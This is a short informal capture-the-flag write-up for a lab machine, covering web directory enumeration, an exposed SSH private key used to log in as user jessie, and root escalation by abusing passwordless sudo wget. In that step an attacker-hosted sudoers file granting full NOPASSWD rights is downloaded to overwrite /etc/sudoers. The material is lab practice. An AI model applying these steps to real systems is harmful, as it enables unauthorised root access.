User flag  

Root flag



after nmap scan found port 80 a defulte ubuntu website 
http://10.10.198.217/

![[Screenshot From 2025-02-28 21-13-34.png]]

using dirb scan to search hidden dir 
![[Screenshot From 2025-02-28 21-22-00.png]]

http://10.10.198.217/sitemap/.ssh/
![[Screenshot From 2025-02-28 21-23-51.png]]
ssh key !!!!



found on source user name i think called jessie 

view-source:http://10.10.198.217/
![[Screenshot From 2025-02-28 21-26-02 1.png]]

trying to login ssh 
![[Screenshot From 2025-02-28 21-28-05.png]]
use chmod to get pirmtion
![[Screenshot From 2025-02-28 21-30-11.png]]

using ssh command 

```bash
ssh Jessie@10.10.198.217 -i id_rsa   
```


im in :) 
locate user flag 
```bash
locate flag.txt
```

![[Screenshot From 2025-02-28 22-00-55.png]]

we have the user flag now 

privsc time 
```bash
sudo -l
```


![[Screenshot From 2025-02-28 22-03-41.png]]

no passwd need for wget 

after lots of time i maneged to replace sudoers file to make jess run root 

by making this file on local machine 
```bash 
sudo echo "jessie ALL=(ALL) NOPASSWD: ALL" > sudoers

```
and upload it to target machine on /etc dir to replace the orignal file 
![[Screenshot From 2025-02-28 22-55-00.png]]


starting server :

```bash
python3 -m http.server 9001

```
using wget to upload the file 
```bash
sudo /usr/bin/wget http://10.8.34.46:9001/sudoers -O sudoers

```
![[Screenshot From 2025-02-28 22-58-24.png]]

male sure to upload the file on /etc with -O to replace the original file 

now 
```bash
sudo su
cat root_flag.txt
```

![[Screenshot From 2025-02-28 23-02-31.png]]